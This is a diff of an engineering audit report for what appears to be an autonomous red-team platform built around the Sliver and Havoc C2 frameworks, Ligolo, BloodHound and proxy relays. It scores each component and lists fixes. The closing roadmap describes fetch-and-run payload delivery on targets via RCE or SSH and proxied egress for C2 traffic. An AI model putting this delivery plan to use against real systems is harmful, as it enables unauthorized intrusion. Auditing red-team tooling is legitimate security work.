-| PSE-001: Sliver gRPC fake | — | — | ❌ BROKEN |
-| PSE-002: deploy_payload no-op | — | — | ❌ BROKEN |
-| PSE-003: Havoc no API/trait | — | — | ❌ BROKEN |
+| PSE-002: Sliver `deploy_payload` runs locally | — | — | ❌ BROKEN |
+| PSE-003: Havoc `deploy_payload` no-op | — | — | ❌ BROKEN |
 | PSE-004: Ligolo skeleton | — | — | ❌ BROKEN |
-| PSE-005: BloodHound no proxy | ⚠️ LEAK | — | ⚠️ LEAK |
-| SS-002: Sliver gRPC egress | ❌ FAIL | — | ❌ FAIL |
-| SS-003: Havoc no proxy wrap | ❌ FAIL | — | ❌ FAIL |
-| IR-001: Compilation error | ❌ FATAL | ❌ FATAL | ❌ FATAL |
-| IR-003: `_level` unused | — | ⚠️ DEGRADED | — |
-| SD-002: CorrelationEngine frozen | — | — | ⚠️ DEGRADED |
+| PSE-007: BloodHound no proxy | ⚠️ LEAK | — | ⚠️ LEAK |
+| SS-004: Raw payload no validation | — | ⚠️ RISK | — |
+| IR-005: Open SOCKS5 relay | ⚠️ EXPOSURE | — | ⚠️ EXPOSURE |
+| IR-002: 154 warnings | — | — | ⚠️ NOISE |
+| SD-004: Nuclei false positives | — | ⚠️ FP | — |
+
+**Resolved since last audit (no longer in matrix)**:
+- IR-001: Build blocked by compilation error → ✅ RESOLVED
+- SS-001: infrastructure::ProxyManager stub → ✅ DEAD CODE
+- SS-002: Sliver gRPC unproxied → ✅ RESOLVED (REST path enforces proxy)
+- SS-003: Havoc no proxy → ✅ RESOLVED (REST path enforces proxy)
+- SD-002 (old): CorrelationEngine frozen snapshot → ✅ RESOLVED
 
 ---
 
 ## 🎖️ COLD TRUTH ASSESSMENT — PRODUCTION READINESS SCORE
 
-### Component-Level Scores
+### Component-Level Scores (V14.1 Snapshot)
 
-| Component | Score | Reasoning |
-|---|---|---|
-| **PocValidator / ApprovalGate** | 7.5/10 | SSRF protection, semantic CLI validation, and sovereign handover flow are genuinely solid. |
-| **SwarmOrchestrator / TokenBudget** | 6.5/10 | RAII token guard, semaphore concurrency cap, panic isolation, and JoinSet DoS limits are real engineering. Budget priority logic built but disconnected. |
-| **CorrelationEngine / AttackGraph** | 5.5/10 | DFS attack path logic and AD heuristics are functional. Single-threaded, frozen-snapshot design limits live utility. |
-| **Sliver C2 Operator** | 3.5/10 | `prepare_payload` makes a real CLI call. `verify_session` reads live CLI output. Deploy is empty, gRPC is fake. |
-| **Havoc Persistence** | 2.0/10 | Wrong CLI args, no REST API, wrong trait, no proxy routing. Expected to fail on any real Havoc binary. |
-| **Ligolo Pivot** | 1.0/10 | Returns a hardcoded static Finding. No subprocess, no network interaction. |
-| **BloodHound Collector** | 6.0/10 | Collection subprocess and ZIP ingestion are correct. Loses points for missing proxy routing. |
-| **Egress/Proxy Isolation** | 5.0/10 | PocValidator enforces fail-closed proxy for HTTP/TCP. C2 plugins bypass entirely. |
-| **Build / Operational Status** | 0.5/10 | **Does not compile.** One trivial lifetime annotation blocks the entire library. |
+| Component | Score | Δ | Reasoning |
+|---|---|---|---|
+| **PocValidator / ApprovalGate** | 8.0/10 | +0.5 | Complexity bifurcation, SSRF, CLI validation, and HALT flow are production-grade. Role-gated approval is real. |
+| **SwarmOrchestrator / TokenBudget** | 7.5/10 | +1.0 | RAII token guard, shared CorrelationEngine, priority admission, panic isolation, DoS limits — genuinely solid infrastructure. |
+| **CorrelationEngine / AttackGraph** | 7.0/10 | +1.5 | DFS path logic, AD heuristics, SAST/DAST source-aware correlation, and now live concurrent updates via `Arc<Mutex<>>`. |
+| **TieredAIRouter / OffPathAI** | 7.5/10 | N/A | Cache (Moka, SipHash), LSH payload deduplication, WAF-aware tier escalation, and graceful provider fallback chain are real engineering. |
+| **Egress/Proxy Isolation** | 7.0/10 | +2.0 | REST calls for Sliver and Havoc enforce fail-closed proxy. OTLP telemetry proxied. DO infrastructure proxied. CLI fallbacks remain un-proxied. |
+| **Sliver C2 Operator** | 5.0/10 | +1.5 | REST session detection is real. `prepare_payload` invokes a real CLI. `deploy_payload` is architecturally broken (runs on operator machine). |
+| **Havoc C2 Operator** | 3.5/10 | +1.5 | Now implements `C2Operator`. REST session detection structure is correct. `deploy_payload` is a no-op. Addressing assumes `127.0.0.1` which fails for remote TeamServer. |
+| **Ligolo Pivot** | 1.0/10 | 0 | Static string. Unchanged. |
+| **BloodHound Collector** | 4.0/10 | -2.0 | Subprocess invocation is correct, but the previous ZIP-ingestion to `CorrelationEngine` pipeline is no longer present in this working tree. Regression. |
+| **Build / Operational Status** | 8.0/10 | +7.5 | Compiles clean. 154 warnings prevent a higher score. |
 
 ---
 
 ### FINAL VERDICT
 
-> **OVERALL SCORE: 3.2 / 10.0**
-> *Classification: Sophisticated Reconnaissance & Validation Engine — Not an Autonomous Red Team Operator*
+> **OVERALL SCORE: 4.8 / 10.0**
+> *Classification: Advanced Reconnaissance & Tactical Validation Platform — Partial Sovereign Operator*
+>
+> Delta from last audit: **+1.6 points**. Meaningful progress on egress isolation, build health, and shared state. The BREACH posture remains broken in its core function.
 
 **What is genuinely built and non-trivial**:
-- V13/V14 PoC safety gates (SSRF, semantic CLI validation, complexity-bifurcated sovereign handover)
-- RAII-based token sovereignty with priority admission control
-- Panic-isolated concurrent agent execution via `catch_unwind`
-- Functional BloodHound ZIP ingestion pipeline feeding `CorrelationEngine`
-- Approval gate with `handover_payload` field supporting the full Sovereign Mode HALT flow
+- Fail-closed proxied egress for all REST C2, infrastructure, and OTLP calls
+- RAII-based priority token budgeting with per-agent caps and overflow protection
+- Live shared `CorrelationEngine` fed by concurrent agents, supporting dynamic attack graph updates
+- Panic-isolated agent execution with DoS-bounded `JoinSet`
+- Complexity-bifurcated sovereign handover with role-gated human-verified exploit gate
+- SipHash-resistant analysis cache with Moka TTL eviction preventing credit bleed
+- LSH payload deduplication with 3-gram SimHash for off-path AI requests
+- Proxied OTLP telemetry with sensitive-field masking in the log writer
+- Proper `C2Operator` trait graph covering both Sliver and Havoc
 
 **What is not built despite being claimed**:
-1. Autonomous C2 session creation — the system reads pre-existing sessions it did not create
-2. Payload deployment — `deploy_payload()` is an acknowledged no-op
-3. Egress isolation for C2 traffic — Sliver gRPC and Havoc API both bypass `ProxyManager`
-4. Live attack graph updates — `CorrelationEngine` is frozen after agent spawn
-5. Compiled binary — the project has a single trivial compilation error that blocks everything
+1. **Autonomous payload delivery** — `deploy_payload()` for Sliver runs `curl` on the operator machine; for Havoc it is silent no-op
+2. **C2 session creation** — the system detects sessions it did not create; no listener or handler is started
+3. **Ligolo pivot** — fully static, no subprocess
+4. **Live BloodHound AD ingestion** — ZIP parsing into `CorrelationEngine` is no longer present in the working tree
+5. **Open relay security** — provisioned DO droplets are unauthenticated SOCKS5 relays during their 4-hour lifetime
 
 ---
 
 ### GO / NO-GO VERDICT
 
-> ## 🔴 NO-GO — CONDITIONAL PATH TO GO
+> ## 🟡 NO-GO — CLOSER TO CONDITIONAL GO THAN LAST AUDIT
 >
-> **The system cannot be deployed. It does not compile (IR-001). Even post-fix, the BREACH posture delivers zero autonomous C2 capability.**
+> **The system compiles and the egress/proxy architecture is now sound. The BREACH posture has a real foundation. It is NOT deployable as an autonomous operator because payload delivery is inert or self-harmful.**
 >
-> **Minimum viable path to a legitimate Go**:
+> **Minimum viable path to legitimate Go**:
 >
-> 1. **Fix `ffi.rs:78`** — Add `-> &'static str` to the `name()` impl. (30 min, zero risk)
-> 2. **Implement `deploy_payload()`** — Wire to SSH/SMB delivery via an existing shell/RCE strike vector, or formally remove from `C2Operator` until ready.
-> 3. **Implement Havoc REST API** — `POST /api/v1/teamserver/payload/generate` or mark behind `#[cfg(feature = "havoc")]` with a compile-time warning.
-> 4. **Add `proxy_manager` to `BloodHoundScanner`** — Route `python3 -m bloodhound` through `proxychains` or a SOCKS5-aware wrapper.
-> 5. **Activate planner routing** — Remove `_` prefix from `level` in `plan_next_step()` and pass `RouteLevel` into the AI analysis call.
-> 6. **Share `CorrelationEngine`** — Wrap in `Arc<tokio::sync::Mutex<CorrelationEngine>>` and pass to spawned agents.
+> 1. **Fix `deploy_payload()` for Sliver** — The `bash -c curl` must execute on the **target** via an established RCE or SSH vector. If delivery is via web serving, the `SliverScanner` or `sovereign.rs::deploy_c2()` must start a temporary HTTP server (e.g., `tokio::net::TcpListener`) serving the staged binary before calling `deploy_payload()`. *(3–5 days)*
+> 2. **Fix `deploy_payload()` for Havoc** — Execute the `Command::new("bash").arg("-c").arg(&delivery_cmd)` call. Subject to the same delivery mechanism issue as Sliver. *(30 min to fix the call, 1–2 days to fix the mechanism)*
+> 3. **Fix Ligolo** — Spawn `ligolo-proxy --listen ...` via `StealthExecutor`, wait for agent connect, validate via REST or stdout matching. *(2 days)*
+> 4. **Add `proxy_manager` to BloodHoundScanner** — Route via `proxychains4` with the best SOCKS5 URL, or use `proxy_manager.wrap_command("proxychains", ...)`. *(4 hours)*
+> 5. **Restore BloodHound ZIP ingestion** — Re-implement `parse_collection_results()` to iterate output ZIPs, deserialize BloodHound JSON, and call `correlation_engine.lock().await.add_finding(...)` for each AD object. *(1 day)*
+> 6. **Authenticate DO SOCKS5 relays** — Add a username/password to the `danted` configuration and populate `ProxyConfig::username/password` on provisioning. *(2 hours)*
+> 7. **Run `cargo fix --lib`** — Eliminate the 133 auto-fixable warnings to surface genuine issues. *(15 minutes)*
 >
-> **Estimated engineering effort to minimum viable BREACH posture**: 3–5 focused engineering days.
+> **Estimated engineering effort to minimum viable BREACH posture**: 5–8 focused engineering days.
